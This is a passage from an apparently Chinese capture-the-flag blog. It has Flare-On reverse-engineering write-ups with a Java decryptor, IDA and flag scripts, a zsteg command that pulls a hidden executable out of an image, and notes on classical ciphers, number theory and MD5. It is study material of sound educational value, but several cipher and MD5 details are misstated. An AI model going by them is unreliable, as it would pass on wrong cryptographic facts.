<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">encrypt</span><span class="params">(<span class="keyword">byte</span>[] inputBytes, String paramString2)</span></span>&#123;</span><br><span class="line">        <span class="keyword">byte</span> keyBytes[] = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            keyBytes = paramString2.getBytes(<span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">byte</span>[] resBytes = <span class="keyword">new</span> <span class="keyword">byte</span>[(inputBytes.length + <span class="number">15</span>) / <span class="number">16</span> * <span class="number">16</span>];</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; inputBytes.length; i += <span class="number">16</span>) &#123;</span><br><span class="line">            <span class="keyword">byte</span>[] tmpBytes = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">16</span>];</span><br><span class="line">            <span class="keyword">int</span> j;</span><br><span class="line">            <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; <span class="number">16</span> &amp;&amp; i + j &lt; inputBytes.length; j++)</span><br><span class="line">                tmpBytes[j] = inputBytes[i + j];</span><br><span class="line">            LightState lightState = <span class="keyword">new</span> LightState(tmpBytes);</span><br><span class="line">            <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt;= <span class="number">10</span>; j++) &#123;</span><br><span class="line">                <span class="keyword">byte</span>[] roundKey = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">16</span>];</span><br><span class="line">                <span class="keyword">int</span> k;</span><br><span class="line">                <span class="keyword">for</span> (k = <span class="number">0</span>; k &lt; <span class="number">16</span>; k++)</span><br><span class="line">                    roundKey[k] = keyBytes[j * <span class="number">16</span> + k];</span><br><span class="line">                <span class="keyword">if</span> (j == <span class="number">0</span>) &#123;</span><br><span class="line">                    lightState.addRoundKey(roundKey);</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (j &lt; <span class="number">10</span>) &#123;</span><br><span class="line">                    lightState.substitute();</span><br><span class="line">                    lightState.shiftRows();</span><br><span class="line">                    lightState.mixCloumns();</span><br><span class="line">                    lightState.addRoundKey(roundKey);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    lightState.substitute();</span><br><span class="line">                    lightState.shiftRows();</span><br><span class="line">                    lightState.addRoundKey(roundKey);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; <span class="number">4</span>; j++) &#123;</span><br><span class="line">                <span class="keyword">int</span> k;</span><br><span class="line">                <span class="keyword">for</span> (k = <span class="number">0</span>; k &lt; <span class="number">4</span>; k++)</span><br><span class="line">                    resBytes[j * <span class="number">4</span> + i + k] = lightState.value(j, k);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// return Base64.encodeToString(resBytes, 2);</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">static</span> String <span class="title">decrypt</span><span class="params">(<span class="keyword">byte</span>[] b, String key)</span></span>&#123;</span><br><span class="line">        <span class="keyword">byte</span>[] keyBytes=<span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            keyBytes=key.getBytes(<span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">byte</span>[] stateByte = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">16</span>];</span><br><span class="line">        <span class="keyword">byte</span>[] plain = <span class="keyword">new</span> <span class="keyword">byte</span>[(b.length+<span class="number">5</span>)/<span class="number">16</span>*<span class="number">16</span>];</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; b.length; i += <span class="number">16</span>) &#123;</span><br><span class="line">            <span class="comment">// 10</span></span><br><span class="line">            LightState ls = <span class="keyword">new</span> LightState();</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;<span class="number">4</span>;j++)&#123;</span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">int</span> k=<span class="number">0</span>;k&lt;<span class="number">4</span>;k++)&#123;</span><br><span class="line">                    ls.setValue(j, k,b[i+j*<span class="number">4</span>+k]);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">10</span>; j &gt;= <span class="number">0</span>; j--) &#123;</span><br><span class="line">                <span class="keyword">byte</span> roundKey[] = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">16</span>];</span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">int</span> k = <span class="number">0</span>; k &lt; <span class="number">16</span>; k++)</span><br><span class="line">                    roundKey[k] = keyBytes[j * <span class="number">16</span> + k];</span><br><span class="line">                <span class="keyword">if</span> (j == <span class="number">0</span>) &#123;</span><br><span class="line">                    ls.addRoundKey(roundKey);</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (j &lt; <span class="number">10</span>) &#123;</span><br><span class="line">                    ls.addRoundKey(roundKey);</span><br><span class="line">                    ls.reMixCloumns();</span><br><span class="line">                    ls.reShiftRows();</span><br><span class="line">                    ls.reSubstitute();</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    ls.addRoundKey(roundKey);</span><br><span class="line">                    ls.reShiftRows();</span><br><span class="line">                    ls.reSubstitute();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            ls.reValue(stateByte);</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;<span class="number">16</span>;j++)&#123;</span><br><span class="line">                plain[i+j]=stateByte[j];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.print(<span class="string">&quot;len:&quot;</span>+plain.length+<span class="string">&quot;\t&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;plain.length;i++)&#123;</span><br><span class="line">            System.out.printf(<span class="string">&quot;0x%x,&quot;</span>,((<span class="keyword">int</span>)plain[i]&amp;<span class="number">0xff</span>));</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println();</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> String(plain);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        Scanner in = <span class="keyword">new</span> Scanner(System.in);</span><br><span class="line">        <span class="comment">// String str = in.next();</span></span><br><span class="line">        <span class="comment">// System.out.println(encrypt(str,</span></span><br><span class="line">        <span class="comment">// &quot;This is a AES-like encryption algorithm. However, we do some change.</span></span><br><span class="line">        <span class="comment">// Therefore, you cannot directly use security class to decrypt the message. Our</span></span><br><span class="line">        <span class="comment">// challenge is to find the plain text of this encrypt message with th fixed</span></span><br><span class="line">        <span class="comment">// key. &quot;)</span></span><br><span class="line">        <span class="comment">// .equals(&quot;kNk3Qz+l/kLpGuKxf5iGE9cOoTmmn9Ac+UdF4b2CHqU=&quot;));</span></span><br><span class="line">        System.out.println(decrypt(</span><br><span class="line">                <span class="keyword">new</span> <span class="keyword">byte</span>[] &#123; (<span class="keyword">byte</span>) <span class="number">144</span>, (<span class="keyword">byte</span>) <span class="number">217</span>, (<span class="keyword">byte</span>) <span class="number">55</span>, (<span class="keyword">byte</span>) <span class="number">67</span>, (<span class="keyword">byte</span>) <span class="number">63</span>, (<span class="keyword">byte</span>) <span class="number">165</span>, (<span class="keyword">byte</span>) <span class="number">254</span>, (<span class="keyword">byte</span>) <span class="number">66</span>,</span><br><span class="line">                        (<span class="keyword">byte</span>) <span class="number">233</span>, (<span class="keyword">byte</span>) <span class="number">26</span>, (<span class="keyword">byte</span>) <span class="number">226</span>, (<span class="keyword">byte</span>) <span class="number">177</span>, (<span class="keyword">byte</span>) <span class="number">127</span>, (<span class="keyword">byte</span>) <span class="number">152</span>, (<span class="keyword">byte</span>) <span class="number">134</span>, (<span class="keyword">byte</span>) <span class="number">19</span>,</span><br><span class="line">                        (<span class="keyword">byte</span>) <span class="number">215</span>, (<span class="keyword">byte</span>) <span class="number">14</span>, (<span class="keyword">byte</span>) <span class="number">161</span>, (<span class="keyword">byte</span>) <span class="number">57</span>, (<span class="keyword">byte</span>) <span class="number">166</span>, (<span class="keyword">byte</span>) <span class="number">159</span>, (<span class="keyword">byte</span>) <span class="number">208</span>, (<span class="keyword">byte</span>) <span class="number">28</span>,</span><br><span class="line">                        (<span class="keyword">byte</span>) <span class="number">249</span>, (<span class="keyword">byte</span>) <span class="number">71</span>, (<span class="keyword">byte</span>) <span class="number">69</span>, (<span class="keyword">byte</span>) <span class="number">225</span>, (<span class="keyword">byte</span>) <span class="number">189</span>, (<span class="keyword">byte</span>) <span class="number">130</span>, (<span class="keyword">byte</span>) <span class="number">30</span>, (<span class="keyword">byte</span>) <span class="number">165</span> &#125;,</span><br><span class="line">                <span class="string">&quot;This is a AES-like encryption algorithm. However, we do some change. Therefore, you cannot directly use security class to decrypt the message. Our challenge is to find the plain text of this encrypt message with th fixed key. &quot;</span>));</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>参考：<a target="_blank" rel="noopener" href="https://www.jb51.net/article/98437.htm">https://www.jb51.net/article/98437.htm</a></p>
<h2 id="rev-flareOn2-Android"><a href="#rev-flareOn2-Android" class="headerlink" title="[rev][flareOn2]Android"></a>[rev][flareOn2]Android</h2><p>质因数分解</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"># encoding:utf-8</span><br><span class="line">import hashlib</span><br><span class="line">import base64</span><br><span class="line">import marshal</span><br><span class="line">import dis</span><br><span class="line"></span><br><span class="line">lines &#x3D; None</span><br><span class="line">with open(&#39;addr.txt&#39;,&#39;r&#39;) as f:</span><br><span class="line">    lines &#x3D; f.readlines()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">toArr &#x3D; lambda x:[int(i,base&#x3D;10) for i in x.replace(&#39; &#39;,&#39;&#39;,-1).replace(&#39;[&#39;,&#39;&#39;,-1).replace(&#39;]&#39;,&#39;&#39;,-1).split(&#39;,&#39;,-1)]</span><br><span class="line">divs &#x3D; toArr(lines[0])</span><br><span class="line">flag &#x3D; &#39;&#39;</span><br><span class="line">for i in range(23):</span><br><span class="line">    val &#x3D; 1</span><br><span class="line">    larr &#x3D; toArr(lines[i+1])</span><br><span class="line">    for j in range(len(larr)&#x2F;&#x2F;2):</span><br><span class="line">        for k in range(larr[j*2]):</span><br><span class="line">            if val*divs[j]&lt;&#x3D;0x7e7e:</span><br><span class="line">                val*&#x3D;divs[j]</span><br><span class="line">    flag+&#x3D;chr((val&gt;&gt;8))</span><br><span class="line">    flag+&#x3D;chr(val&amp;0xff)</span><br><span class="line">    print(i,hex(val),flag)</span><br><span class="line">print(flag)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="rev-FlareOn4-zsud"><a href="#rev-FlareOn4-zsud" class="headerlink" title="[rev][FlareOn4]zsud"></a>[rev][FlareOn4]zsud</h2><p>参考 <a target="_blank" rel="noopener" href="https://www.cnblogs.com/harmonica11/p/13162759.html">https://www.cnblogs.com/harmonica11/p/13162759.html</a></p>
<p><a target="_blank" rel="noopener" href="https://www.fireeye.com/content/dam/fireeye-www/global/en/blog/threat-research/Flare-On%202017/Challenge7.pdf">https://www.fireeye.com/content/dam/fireeye-www/global/en/blog/threat-research/Flare-On%202017/Challenge7.pdf</a></p>
<p>首先是个超深度调用403690，直接写脚本跟进去</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">addr = <span class="number">0x403690</span></span><br><span class="line">r = get_bytes(addr,<span class="number">5</span>)</span><br><span class="line">p=<span class="literal">True</span></span><br><span class="line"><span class="keyword">while</span> r[<span class="number">0</span>]==<span class="number">0xE9</span>:</span><br><span class="line">    dif = r[<span class="number">1</span>]|(r[<span class="number">2</span>]&lt;&lt;<span class="number">8</span>)|(r[<span class="number">3</span>]&lt;&lt;<span class="number">16</span>)|(r[<span class="number">4</span>]&lt;&lt;<span class="number">24</span>)</span><br><span class="line">    <span class="keyword">if</span> dif&gt;=<span class="number">0x80000000</span>:</span><br><span class="line">        dif-=<span class="number">0x100000000</span></span><br><span class="line">    addr+=dif+<span class="number">5</span></span><br><span class="line">    <span class="keyword">if</span> p:</span><br><span class="line">        print(hex(addr))</span><br><span class="line">        p=<span class="literal">False</span></span><br><span class="line">    r = get_bytes(addr,<span class="number">5</span>)</span><br><span class="line">print(hex(addr))</span><br></pre></td></tr></table></figure>
<p>得到了4027e0，可以使用IDA的书签功能(Alt+M,Ctrl+M)</p>
<p>往后面走，找到一个API函数CorBindToRuntimeEx，是关于.net的函数</p>
<p>有两种混淆，第一种就是深度jump，第二种是加密字符串和函数。开头一个startThread就是填各种函数。执行过程中有动态解密字符串</p>
<p>程序中使用了不存在的访问路径，所以应该确定是不是hook了相关函数</p>
<p>然后使用CE搜索内存中的This字符串，找到那个要执行的dll(This program cannot…)，dump出来，拖进dnspy(直接IDA列出字符串也可以，我大意了)</p>
<p>IDA的字符串也可以(clr.pdb)显示出通过.net运行</p>
<p>发现解密并执行了一段powershell脚本(参数)，这时想起调用CorBindToRuntimeEx时的最后一个参数正是一个base64串，溯源找到原来的字符串，我tm直接解密</p>
<p>得到了一个很大的powershell脚本(<del>卒</del>)</p>
<p>可以通过不断地走路得到整个游戏的地图</p>
<h2 id="rev-FlareOn2-gdssagh"><a href="#rev-FlareOn2-gdssagh" class="headerlink" title="[rev][FlareOn2]gdssagh"></a>[rev][FlareOn2]gdssagh</h2><p>打开运行，没什么东西</p>
<p>但是发现long jmp下面有个base64串，我tm直接解码，之后是PNG文件头，打开是个图片，没东西</p>
<p>找找图片隐写工具zsteg，发现有种类型是有PE文件的</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zsteg -v -E b1,rgb,msb,xy ./addr.png b1,rgb,msb,xy &gt; 1.exe</span><br></pre></td></tr></table></figure>
<p>提取出来后直接strings</p>
<h2 id="rev-FlareOn4-notepad"><a href="#rev-FlareOn4-notepad" class="headerlink" title="[rev][FlareOn4]notepad"></a>[rev][FlareOn4]notepad</h2><p>前面各种校验，然后会读取用户文件夹下flareon2016challenge下的文件，这里其实提示应该去找flareon2016的比赛文件，按照感染顺序打开文件，每个文件会分别写入key的8个字节，然后就得到结果了</p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
      

      
      <div class="clearfix"></div>
    </div>
      
    
  </div>
  
</article>







  
    <article id="post-note/rev/usual_cipher" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2020/10/21/note/rev/usual_cipher/" class="article-date">
  	<time datetime="2020-10-21T10:50:40.000Z" itemprop="datePublished">2020-10-21</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/10/21/note/rev/usual_cipher/">
        常见加密算法
        
      </a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="古典加密算法-编码算法"><a href="#古典加密算法-编码算法" class="headerlink" title="古典加密算法/编码算法"></a>古典加密算法/编码算法</h2><h3 id="凯撒加密"><a href="#凯撒加密" class="headerlink" title="凯撒加密"></a>凯撒加密</h3><p>也叫移位密码</p>
<p>若a–1,b–2,c–3…，则对于明文中任意一个字符$\alpha$，有$\alpha=(\alpha+\beta)%26$，其中$\beta$是密钥</p>
<p>破解方式：穷举密钥，可以配合统计字母频率</p>
<h3 id="仿射密码"><a href="#仿射密码" class="headerlink" title="仿射密码"></a>仿射密码</h3><p>quotaed-printable密码</p>
<p>$e(x)=ax+b$，其中$a$和字母数$m$互素</p>
<p>$d(x)=a^{-1}(x-b),a^{-1}a\equiv1\mod m$</p>
<h3 id="凯撒加密升级版"><a href="#凯撒加密升级版" class="headerlink" title="凯撒加密升级版"></a>凯撒加密升级版</h3><p>单表代换密码：每一个字符被替换成不同的字符，偏移量不再像凯撒密码一样固定</p>
<p>破解方式：统计字母频率，然后把频率高的替换成实际情况下频率高的</p>
<h3 id="维吉尼亚密码"><a href="#维吉尼亚密码" class="headerlink" title="维吉尼亚密码"></a>维吉尼亚密码</h3><p>参考：维吉尼亚密码的原理及破解 - ZCyu的文章 - 知乎<br><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/111611977">https://zhuanlan.zhihu.com/p/111611977</a></p>
<p>假设明文为$P=p_1p_2…p_n$，密钥为$K=k_1k_2…k_m$，密文为$C=c_1c_2…c_n$</p>
<p>则$c_i=(p_i+k_{i\mod m})\mod 26\p_i=(c_i-k_{i\mod m})\mod 26$</p>
<p>例子：明文ILOVEMIMAXUE,密钥 AWSL，密文 IHGGEIAXATMP</p>
<h4 id="破解方式"><a href="#破解方式" class="headerlink" title="破解方式"></a>破解方式</h4><p>由于维吉尼亚密码每一个字母的加密还与它在明文中的位置有关，所以简单的字母频率分析不起作用</p>
<ol>
<li>Kasiski测试</li>
</ol>
<p>由于密钥循环重复，知道密钥长度m后破解难度就会降低。使用Kasiski测试，将相同的字母组找出来，然后求距离差的最大公约数，猜测m</p>
<p>因为给定长度为m的密钥周期性地加密，当铭文中有两个相同的字母组(长度大于3)，在明文序列中相隔字符数为m地倍数时，加密出的密文必定相同。反过来，若密文中出现相同的组合，则对应的明文字母组未必相同，但是相同的可能性极大</p>
<ol start="2">
<li>重合指数法</li>
</ol>
<p>设一门语言由n个字母组成，每个字母发生的概率为$P_i$，则重合指数指其中两个随机元素相同的概率的和$CI=\sum\limits_{i=1}^nP_i^2$</p>
<p>完全随机的英文文本$CI=26\left(\frac{1}{26}\right)^2=0.0385$，有意义的英文文本$CI=0.065$</p>
<p>实际使用的是$CI$的估计值$CI’$，$L$为密文长度，$f_i$为第$i$个字母发生的次数$CI’=\sum\limits_{i=1}^n\frac{f_i}L\cdot\frac{f_i-1}{L-1}$</p>
<p>如果密文重合指数较低，就是多表代换密码，如果结果接近0.065，则猜测正确</p>
<p>测试m=1,2,3,…</p>
<p>可以把明文分成m个一组，假设密钥长度为m，则每组的相同位置的密钥相同，可以基于这个特点检测重合指数，判断密钥长度</p>
<ol start="3">
<li>Chi测试(应该是卡方检验吧，测试统计样本和理论值的偏移程度)</li>
</ol>
<p>用于确定密钥内容</p>
<p>某种语言由$n$个字母组成，$p_i$为字母$i$在维吉尼亚密文分布中发生的概率$q_i$表示在正常英文文本中发生的概率，拟重合指数定义为</p>
<p>$\chi=\sum\limits_{i=1}^np_iq_i$</p>
<blockquote>
<p>对于一个移位密码</p>
</blockquote>
<ol>
<li>统计每个字母的频数$f_0,f_1,…,f_{26}$</li>
<li>令密文长度为$n’=\frac{n}m$，则字母的频率分布$p_i=\frac{f_i}{n’}$</li>
<li>通常文本概率分布$q_0,q_1,…,q_{26}$</li>
<li>对于每一列进行移位，得到每一位对应的偏移量i，得到$P_i=p_{26-i},…,p_{25},p_0,p_1,…,p_{25-i}$</li>
<li>对分布$P_i$和$Q$进行相关卷积计算$C(P_i,Q)=\sum\limits_{j=0}^26P_{(i+j)\mod 26\cdot q_j}$</li>
<li>得到最大相关值即为偏移量的估计值</li>
</ol>
<h2 id="相关数论基础"><a href="#相关数论基础" class="headerlink" title="相关数论基础"></a>相关数论基础</h2><h3 id="辗转相除法"><a href="#辗转相除法" class="headerlink" title="辗转相除法"></a>辗转相除法</h3><p>用于计算两个数的最大公约数，也叫欧几里得法</p>
<p>$gcd(a,b)=gcd(b,a\ mod\ b),a,b\in Z$</p>
<p>直到</p>
<p>$a%b=0$</p>
<p>此时$b$就是最大公约数</p>
<p>证明过程待后续</p>
<p>代码实现</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">uint32_t</span> <span class="title">gcd</span><span class="params">(<span class="keyword">int32_t</span> a,<span class="keyword">int32_t</span> b)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int32_t</span> t;</span><br><span class="line">    <span class="keyword">while</span>(b)&#123;</span><br><span class="line">        t=a%b;</span><br><span class="line">        a=b;</span><br><span class="line">        b=t;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> a;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="快速幂"><a href="#快速幂" class="headerlink" title="快速幂"></a>快速幂</h3><p>用于快速计算$a^n,n\in N,a\in Z$</p>
<p>$$<br>a^n=\begin{cases}<br>a^{n-1}\cdot a,n\ is\ odd<br>\a^{\frac{n}{2}}\cdot a^{\frac{n}{2}},n\ is\ even<br>\end{cases}<br>$$</p>
<p>代码实现</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int32_t</span> <span class="title">qpow</span><span class="params">(<span class="keyword">int32_t</span> a,<span class="keyword">uint32_t</span> n)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int32_t</span> ans=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span>(n)&#123;</span><br><span class="line">        <span class="keyword">if</span>(n&amp;<span class="number">1</span>)&#123;</span><br><span class="line">            ans*=a;</span><br><span class="line">        &#125;</span><br><span class="line">        a*=a;</span><br><span class="line">        n&gt;&gt;=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="中国剩余定理"><a href="#中国剩余定理" class="headerlink" title="中国剩余定理"></a>中国剩余定理</h3><p>给出以下的一元线性同余方程组</p>
<p>$$<br>S:\begin{cases}<br>x\equiv a_1(mod\ m_1)\<br>x\equiv a_2(mod\ m_2)\<br>\ \ \ \ \vdots\<br>x\equiv a_n(mod\ m_n)<br>\end{cases}<br>$$</p>
<p>中国剩余定理给出了有解的判定条件和解的具体形式</p>
<p>若$m_1,m_2,…,m_n$中任两数互质，则对任意整数$a_1,a_2,…,a_n$，方程组$S$有解，通解通过如下方式得到</p>
<ol>
<li><p>$M\prod\limits_{i=1}^{n}m_i,M_i=M/m_i,\forall i\in{1,2,…,n}$</p>
</li>
<li><p>$t_i=M_i^{-1}(mod\ m_i)$</p>
</li>
<li><p>$x\equiv \sum\limits_{i=1}^{n}a_it_iM_i(mod\ M)$</p>
</li>
</ol>
<h4 id="证明"><a href="#证明" class="headerlink" title="证明"></a>证明</h4><p>由假设，$gcd(M_i,m_i)=1$，则$M_i^{-1}(mod\ m_i)$存在。</p>
<p>考察$x\ mod\ m_i,\because\forall j\ne i,M_j\equiv 0(mod\ m_i)$，从而得到$x\equiv a_it_iM_i(mod\ m_i)$</p>
<p>而$t_iM_i\equiv1(mod\ m_i)$，从而$x\equiv a_i(mod\ m_i)$</p>
<p>唯一性：</p>
<p>设$x_1,x_2$都是$S$的解，则$\forall i\in{1,2,…,n},x_1-x_2\equiv 0(mod\ m_i)$</p>
<p>而$gcd(m_i,m_j)=1,i\ne j,i,j\in{1,2,…,n}$，从而由$x_1-x_2\equiv0(mod\ M)$，从而说明是$x_1=x_2$</p>
<h3 id="费马小定理"><a href="#费马小定理" class="headerlink" title="费马小定理"></a>费马小定理</h3><p>$a^{p-1}\equiv 1(mod\ p),p$是质数且$a\ne0(mod\ p)$</p>
<h2 id="hash算法"><a href="#hash算法" class="headerlink" title="hash算法"></a>hash算法</h2><h3 id="md5"><a href="#md5" class="headerlink" title="md5"></a>md5</h3><ol>
<li>填充</li>
</ol>
<p>在消息后面先填充一个1，再填充0，直到消息长度mod 512=448，之后再将消息长度的低64位填充到消息结尾</p>
<ol start="2">
<li>定义几个运算</li>
</ol>
<p>F(x,y,z)=(x&amp;y)|(~x&amp;z)</p>
<p>G(x,y,z)=(x&amp;z)|(y&amp;~z)</p>
<p>H(x,y,z)=x^y^z</p>
<p>I(x,y,z)=y^(x|~z)</p>
<p>ROL32(x,i) 左移32位</p>
<p>填充后的消息以512为一个分组，每个分组可以分成16个32位子分组$W_j(0&lt;j&lt;15)$</p>
<p>FF(a,b,c,d,M_j,s,t_i): a=b+ROL32(a+(F(b,c,d)+M_j+t_i),s)</p>
<p>GG(a,b,c,d,M_j,s,t_i): a=b+ROL32(a+(G(b,c,d)+M_j+t_i),s)</p>
<p>HH(a,b,c,d,M_j,s,t_i): a=b+ROL32(a+(H(b,c,d)+M_j+t_i),s)</p>
<p>II(a,b,c,d,M_j,s,t_i): a=b+ROL32(a+(I(b,c,d)+M_j+t_i),s)</p>
<ol start="3">
<li>定义初始化向量</li>
</ol>
<p>A=0x01234567</p>
<p>B=0x89abcdef</p>
<p>C=0xfedcba98</p>
<p>D=0x76543210</p>
<ol start="4">
